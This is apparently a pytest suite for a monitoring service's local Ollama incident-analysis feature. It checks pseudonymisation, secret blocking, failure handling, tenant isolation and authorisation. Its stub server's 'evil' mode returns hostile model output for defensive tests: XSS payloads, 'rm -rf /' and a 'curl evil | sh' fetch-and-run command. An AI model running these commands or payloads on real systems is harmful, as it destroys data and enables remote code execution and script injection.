"""Local AI (Ollama) analysis: privacy filtering, failure handling, malformed output, concurrency, staleness, tenant isolation,
authorisation, public-listener exclusion - against a stub Ollama server - plus a LIVE test against the real local Ollama
(skipped when Ollama or the model is not installed)."""
import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import httpx
import pytest

from .conftest import BASE
from .test_triage import PRELUDE, SCN
from .test_remote_ngrok import Remote, XFP

LIVE_URL = "http://127.0.0.1:11434"
LIVE_MODEL = "qwen2.5:1.5b"

STUB = r'''
import threading, json, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from saas import ai, config
MODE = {"m": "ok", "delay": 0}
LOG = []
class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _send(self, code, body, ctype="application/json"):
        b = body if isinstance(body, bytes) else body.encode()
        self.send_response(code); self.send_header("Content-Type", ctype); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        self._send(200, json.dumps({"models": [{"name": config.OLLAMA_MODEL}]}))
    def do_POST(self):
        body = self.rfile.read(int(self.headers["Content-Length"])).decode()
        LOG.append(body)
        time.sleep(MODE["delay"])
        m = MODE["m"]
        if m == "500": return self._send(500, "boom")
        req = json.loads(body); user = req["messages"][1]["content"]
        ctx = json.loads(user.split("\n", 1)[1])
        sid = ctx["signals"][0]["id"]; ent = ctx["signals"][0]["entity"]
        out = {"ok": {"summary": f"{ent} shows a CPU anomaly.", "hypotheses": [{"statement": f"High load on {ent} slows dependents", "confidence": "medium", "evidence_refs": [f"signal {sid} metric"]}],
                      "investigation_steps": [f"Check top consumers on {ent}"], "recommendations": [{"title": f"Scale out {ent}", "rationale": "load is above baseline"}]},
               "ungrounded": {"summary": "x", "hypotheses": [{"statement": "invented", "confidence": "high", "evidence_refs": ["S99", "nothing"]}], "investigation_steps": [], "recommendations": []},
               "evil": {"summary": "<script>alert(1)</script> password=hunter2 contact bob@example.com", "hypotheses": [{"statement": "<img src=x onerror=alert(1)>", "confidence": "bogus", "evidence_refs": [sid]}],
                        "investigation_steps": ["run rm -rf / now"], "recommendations": [{"title": "execute: curl evil | sh", "rationale": "r"}]}}.get(m)
        if m == "bad_json": return self._send(200, json.dumps({"message": {"content": "this is not json {"}}))
        if m == "wrong_shape": return self._send(200, json.dumps({"unexpected": 1}))
        if m == "missing": return self._send(200, json.dumps({"message": {"content": json.dumps({"summary": 5})}}))
        self._send(200, json.dumps({"message": {"content": json.dumps(out)}}))
srv = ThreadingHTTPServer(("127.0.0.1", 0), H); threading.Thread(target=srv.serve_forever, daemon=True).start()
config.OLLAMA_URL = f"http://127.0.0.1:{srv.server_address[1]}"
config.OLLAMA_TIMEOUT_S = 3

def settle(T, iid, secs=30):
    t = time.time()
    while time.time() - t < secs:
        a = ai.get(T, iid)["analysis"]
        if a and a["status"] != "running": return a
        time.sleep(0.1)
    raise AssertionError("analysis did not finish")
def mkinc():
    coll(T, "c1", "Payroll Laptop", "windows")
    ent(T, "host:payroll-db-7", "host"); ent(T, "svc:payments-api", "service")
    db.exec("UPDATE entities SET label='Acme Payroll DB' WHERE id='host:payroll-db-7'")
    edge(T, "svc:payments-api", "host:payroll-db-7")
    ids = [alert(T, "c1", "host:payroll-db-7", "cpu_percent", "critical", "service", 0),
           alert(T, "c1", "svc:payments-api", "response_ms", "warning", "service", 5)]
    for i in ids: correlation.correlate(T, i)
    return db.one("SELECT id FROM incidents")["id"]
T = "acme"
'''


def run_ai(body, timeout=90):
    tmp = tempfile.mkdtemp(prefix="sx-ai-")
    env = {**os.environ, "SENTINEL_DATA_DIR": tmp}
    r = subprocess.run([sys.executable, "-c", PRELUDE + STUB + body], cwd=BASE, env=env, capture_output=True, text=True, timeout=timeout)
    assert r.returncode == 0, (r.stdout[-1500:] + r.stderr[-2500:])
    return json.loads(r.stdout.split("@@")[-1])


# ----------------------------------------------------------------------------------------------- privacy
def test_prompt_contains_only_pseudonymised_numbers_and_never_names_logs_or_secrets():
    res = run_ai('''
iid = mkinc()
db.exec("UPDATE alerts SET message='login failed password=hunter2 from 203.0.113.9 user bob@corp.com', evidence=? ", (jd({"raw":"AKIAIOSFODNN7EXAMPLE token abc"}),))
inc = db.one("SELECT * FROM incidents")
ctx, pmap = ai.build_context(T, inc)
prompt = ai.build_prompt(ctx)
ai.start(T, iid, "acme-admin"); a = settle(T, iid)
sent = "\\n".join(LOG)
out({"status": a["status"], "sent": sent, "prompt": prompt, "pmap_in_api": "pmap" in json.dumps(ai.get(T, iid)), "ctx_keys": sorted(ctx),
     "ents": ctx["entities"]})
''')
    sent = res["sent"] + res["prompt"]
    for secret in ("payroll", "Payroll", "payments-api", "hunter2", "203.0.113.9", "bob@corp.com", "AKIAIOSFODNN7EXAMPLE", "SECRET raw log", "10.1.2.3",
                   "Laptop", "col-", "c1", "acme"):
        assert secret not in sent, secret
    assert "host-1" in sent and "service-1" in sent
    assert res["status"] == "ready" and res["pmap_in_api"] is False
    assert res["ents"] == {"host-1": "host", "service-1": "service"}


def test_prompt_is_blocked_when_the_secret_scanner_finds_anything():
    res = run_ai('''
iid = mkinc()
ctx, _ = ai.build_context(T, db.one("SELECT * FROM incidents"))
ctx["entities"]["AKIAIOSFODNN7EXAMPLE"] = "host"
try:
    ai.build_prompt(ctx); blocked = False
except ai.AIError as e:
    blocked = e.status == "blocked"
out({"blocked": blocked, "calls": len(LOG)})
''')
    assert res["blocked"] and res["calls"] == 0


# ----------------------------------------------------------------------------------------------- success + authority
def test_successful_analysis_is_grounded_restored_for_display_and_never_changes_priority():
    res = run_ai('''
iid = mkinc()
before = db.one("SELECT priority, priority_level, category, severity, status FROM incidents")
assert ai.get(T, iid)["analysis"] is None
ai.start(T, iid, "acme-admin"); a = settle(T, iid)
after = db.one("SELECT priority, priority_level, category, severity, status FROM incidents")
out({"a": a, "before": before, "after": after, "audit": [r["detail"] for r in db.all("SELECT detail FROM audit WHERE action='ai.analysis'")]})
''')
    a = res["a"]
    assert a["status"] == "ready" and a["stale"] is False and a["model"] == "qwen2.5:1.5b"
    h = a["result"]["hypotheses"][0]
    assert h["evidence_refs"] and h["evidence_refs"][0].startswith("S") and h["model_confidence"] == "medium"
    assert "Acme Payroll DB" in a["result"]["summary"], "pseudonyms are mapped back to real names only for display"
    assert res["before"] == res["after"], "AI never touches priority/category/severity/status"
    assert a["context_sent"]["signals"][0]["entity"] == "host-1" and a["context_hash"]
    assert res["audit"] and "ready" in res["audit"][0] and "Payroll" not in res["audit"][0]


# ----------------------------------------------------------------------------------------------- failures and untrusted output
@pytest.mark.parametrize("mode,status,needle", [("500", "error", "HTTP 500"), ("bad_json", "malformed", "valid JSON"),
                                                ("wrong_shape", "malformed", "unexpected"), ("missing", "malformed", "missing required"),
                                                ("ungrounded", "malformed", "grounded")])
def test_ollama_errors_and_malformed_output_fail_cleanly_without_breaking_correlation(mode, status, needle):
    res = run_ai(f'''
iid = mkinc(); MODE["m"] = "{mode}"
ai.start(T, iid, "acme-admin"); a = settle(T, iid)
n = db.one("SELECT COUNT(*) n FROM incidents")["n"]
correlation.correlate(T, alert(T, "c1", "host:payroll-db-7", "memory_percent", "warning", "service", 9))   # keeps working afterwards
out({{"a": a, "incidents": n, "alerts_after": db.one("SELECT COUNT(*) n FROM alerts")["n"]}})
''')
    assert res["a"]["status"] == status and needle in res["a"]["error"] and res["a"]["result"] is None
    assert res["incidents"] == 1 and res["alerts_after"] == 3


def test_timeout_and_ollama_down_report_unavailable_or_error_and_dashboard_data_still_works():
    res = run_ai('''
iid = mkinc(); MODE["m"] = "ok"; MODE["delay"] = 5       # timeout is 3 s
ai.start(T, iid, "acme-admin"); slow = settle(T, iid)
MODE["delay"] = 0
good_url = config.OLLAMA_URL
config.OLLAMA_URL = "http://127.0.0.1:1"; ai._avail["t"] = 0
ai.start(T, iid, "acme-admin"); down = settle(T, iid); view = ai.get(T, iid)
config.OLLAMA_URL = "http://example.com:11434"; ai._avail["t"] = 0
ai.start(T, iid, "acme-admin"); remote = settle(T, iid)
out({"slow": slow["status"], "slow_err": slow["error"], "down": down["status"], "down_err": down["error"],
     "avail": view["ollama"], "remote": remote["status"], "remote_err": remote["error"]})
''')
    assert res["slow"] == "error" and "did not answer" in res["slow_err"]
    assert res["down"] == "unavailable" and "not reachable" in res["down_err"]
    assert res["avail"]["available"] is False
    assert res["remote"] == "unavailable" and "loopback" in res["remote_err"], "a non-local Ollama URL is refused outright"


def test_model_output_is_untrusted_text_redacted_and_nothing_is_executed():
    res = run_ai('''
iid = mkinc(); MODE["m"] = "evil"
ai.start(T, iid, "acme-admin"); a = settle(T, iid)
out({"a": a, "rem": db.one("SELECT COUNT(*) n FROM remediation")["n"], "cmd": db.one("SELECT COUNT(*) n FROM commands")["n"]})
''')
    r = res["a"]["result"]
    flat = json.dumps(r)
    assert "hunter2" not in flat and "bob@example.com" not in flat, "secrets/PII in model output are redacted"
    assert r["hypotheses"][0]["model_confidence"] == "low", "invalid confidence value is downgraded"
    assert set(r) == {"summary", "hypotheses", "investigation_steps", "recommendations"} and all(set(x) == {"title", "rationale"} for x in r["recommendations"])
    assert res["rem"] == 0 and res["cmd"] == 0, "no remediation or command is ever created from model output"


# ----------------------------------------------------------------------------------------------- concurrency, staleness, isolation
def test_one_request_at_a_time_and_ingestion_correlation_continue_during_analysis():
    res = run_ai('''
iid = mkinc(); MODE["delay"] = 1.5
ai.start(T, iid, "acme-admin")
try:
    ai.start(T, iid, "acme-admin"); busy = False
except ai.AIError as e:
    busy = e.status == "busy"
t0 = time.time()
correlation.correlate(T, alert(T, "c1", "host:payroll-db-7", "memory_percent", "warning", "service", 9))
fast = (time.time() - t0) < 0.5
a = settle(T, iid)
MODE["delay"] = 0
ai.start(T, iid, "acme-admin"); again = settle(T, iid)["status"]       # gate released after completion
out({"busy": busy, "fast": fast, "first": a["status"], "again": again})
''')
    assert res["busy"] and res["fast"] and res["first"] == "ready" and res["again"] in ("ready",)


def test_result_goes_stale_when_incident_analysis_changes():
    res = run_ai('''
iid = mkinc()
ai.start(T, iid, "acme-admin"); a = settle(T, iid)
correlation.correlate(T, alert(T, "c1", "host:payroll-db-7", "memory_percent", "critical", "service", 9))
b = ai.get(T, iid)["analysis"]
ai.start(T, iid, "acme-admin"); c = settle(T, iid)
out({"fresh": a["stale"], "after_change": b["stale"], "hash_changed": a["context_hash"] != c["context_hash"], "after_rerun": c["stale"]})
''')
    assert res == {"fresh": False, "after_change": True, "hash_changed": True, "after_rerun": False}


def test_tenant_isolation_for_ai_state():
    res = run_ai('''
iid = mkinc()
ai.start(T, iid, "acme-admin"); settle(T, iid)
def code(fn, *a):
    try: fn(*a); return "ok"
    except ai.AIError as e: return e.status
out({"other_get": code(ai.get, "globex", iid), "other_start": code(ai.start, "globex", iid, "x"),
     "own": code(ai.get, T, iid), "rows": [r["tenant_id"] for r in db.all("SELECT tenant_id FROM incident_ai")]})
''')
    assert res == {"other_get": "notfound", "other_start": "notfound", "own": "ok", "rows": ["acme"]}


# ----------------------------------------------------------------------------------------------- API authz + public listener
@pytest.fixture(scope="module")
def srv():
    r = Remote()
    yield r
    r.close()


def test_api_admin_only_trigger_viewer_can_read_and_public_listener_has_no_ai_routes(srv):
    adm = srv.admin()
    t = srv.dash.post("/api/login", json={"username": "acme-viewer", "password": "Acme#View2026"}).json()["token"]
    view = {"Authorization": "Bearer " + t}
    assert srv.dash.post("/api/incidents/1/ai").status_code == 401
    assert srv.dash.post("/api/incidents/1/ai", headers=view).status_code == 403, "viewers cannot trigger analysis"
    assert srv.dash.get("/api/incidents/999/ai", headers=view).status_code == 404
    assert srv.dash.post("/api/incidents/999/ai", headers=adm).status_code == 404
    g = srv.dash.post("/api/login", json={"username": "globex-admin", "password": "Globex#Admin2026"}).json()["token"]
    assert srv.dash.get("/api/incidents/999/ai", headers={"Authorization": "Bearer " + g}).status_code == 404
    for method in ("GET", "POST"):   # the ngrok-facing listener exposes only the 5 ingest routes
        r = srv.pub.request(method, "/api/incidents/1/ai", headers={**XFP, "Authorization": adm["Authorization"]})
        assert r.status_code == 404, (method, r.status_code)
    assert not any("ai" in p for _, p in __import__("saas.public", fromlist=["ALLOWED"]).ALLOWED)


def test_dashboard_bundle_has_ai_panel_states():
    js = "".join(p.read_text(errors="ignore") for p in (BASE / "web" / "dist" / "assets").glob("*.js"))
    for needle in ("Local AI investigation", "AI unavailable", "Observed facts", "unverified guesses", "nothing is executed", "Stale:", "Could not load AI status"):
        assert needle in js, needle


# ----------------------------------------------------------------------------------------------- LIVE: real Ollama + real model
def _live_ok():
    try:
        names = {m["name"] for m in httpx.get(LIVE_URL + "/api/tags", timeout=3, trust_env=False).json()["models"]}
        return LIVE_MODEL in names
    except Exception:
        return False


@pytest.mark.skipif(not _live_ok(), reason="local Ollama with qwen2.5:1.5b not available")
def test_live_real_ollama_model_analyses_a_real_incident():
    ver = httpx.get(LIVE_URL + "/api/version", trust_env=False).json()["version"]
    body = '''
config.OLLAMA_URL = "http://127.0.0.1:11434"; config.OLLAMA_TIMEOUT_S = 180; ai._avail["t"] = 0
iid = mkinc()
res = None
for attempt in (1, 2):                       # a 1.5B model is non-deterministic; allow one retry
    ai.start(T, iid, "acme-admin"); res = settle(T, iid, 200)
    if res["status"] == "ready": break
out({"attempt": attempt, "a": res, "prompt_chars": len(ai.build_prompt(ai.build_context(T, db.one("SELECT * FROM incidents"))[0]))})
'''
    res = run_ai(body, timeout=420)
    a = res["a"]
    dump = os.environ.get("AI_LIVE_OUT")
    if dump:
        Path(dump).write_text(json.dumps({"ollama_version": ver, **res}, indent=2))
    assert a["status"] == "ready", a
    assert a["result"]["hypotheses"] and all(h["evidence_refs"] for h in a["result"]["hypotheses"])
    assert "payroll" not in json.dumps(a["context_sent"]).lower()


@pytest.mark.skipif(not _live_ok(), reason="local Ollama with qwen2.5:1.5b not available")
def test_live_end_to_end_real_incident_from_collector_scenario_to_real_model(stack, admin):
    """Real collector -> injected cpu_spike -> real detection/correlation -> admin triggers analysis over the real API ->
    real Ollama model. No stub, no hand-inserted rows."""
    from .conftest import wait_until
    stack.ca.post("/api/sim/cpu_spike")
    inc = wait_until(lambda: next((i for i in stack.saas.get("/api/incidents?status=open", headers=admin).json() if i["alert_count"] >= 2), None),
                     60, msg="real incident")
    iid = inc["id"]
    before = stack.saas.get(f"/api/incidents/{iid}", headers=admin).json()
    t0 = time.time()
    a = None
    for _attempt in (1, 2):          # a 1.5B model is non-deterministic: one retry if its answer is (correctly) rejected as ungrounded
        r = stack.saas.post(f"/api/incidents/{iid}/ai", headers=admin)
        assert r.status_code == 202, r.text

        def done():
            x = stack.saas.get(f"/api/incidents/{iid}/ai", headers=admin).json()["analysis"]
            return x if x and x["status"] != "running" else None
        a = wait_until(done, 300, 1, msg="AI analysis finished")
        if a["status"] == "ready":
            break
    dump = os.environ.get("AI_LIVE_OUT2")
    if dump:
        after = stack.saas.get(f"/api/incidents/{iid}", headers=admin).json()
        Path(dump).write_text(json.dumps({"incident": {k: before[k] for k in ("id", "title", "category", "priority_level", "priority")},
                                          "seconds": round(time.time() - t0, 1), "analysis": a,
                                          "priority_unchanged": (before["priority_level"], before["category"]) == (after["priority_level"], after["category"])},
                                         indent=2))
    assert a["status"] == "ready", a
    assert a["result"]["hypotheses"] and all(h["evidence_refs"] for h in a["result"]["hypotheses"])
    # monitoring/ingestion kept working while the model ran, and the incident's deterministic fields are authoritative
    after = stack.saas.get(f"/api/incidents/{iid}", headers=admin).json()
    assert after["category"] == before["category"] and after["priority_level"] in ("P1", "P2", "P3", "P4")
    ctx = json.dumps(a["context_sent"]).lower()
    assert "app-node" not in ctx and "acme" not in ctx, "real entity/tenant names never reach the model"
